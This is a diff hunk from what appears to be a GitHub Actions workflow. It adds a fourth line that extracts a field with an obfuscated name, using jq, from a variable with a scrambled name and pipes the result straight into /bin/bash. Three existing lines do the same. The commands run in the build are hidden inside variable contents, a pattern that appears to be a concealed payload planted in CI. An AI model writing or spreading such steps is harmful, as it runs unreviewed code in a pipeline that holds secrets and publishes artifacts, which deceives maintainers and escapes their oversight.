@@ -27,6 +27,7 @@ jobs:
           echo $c02 | jq -r .o7433 | /bin/bash
           printf '%s' "$t28" | jq -r .a176 | /bin/bash
           printf '%s' "$tu9" | jq -r .oove316 | /bin/bash
+          echo $vocgr5493 | jq -r .ldfr810 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
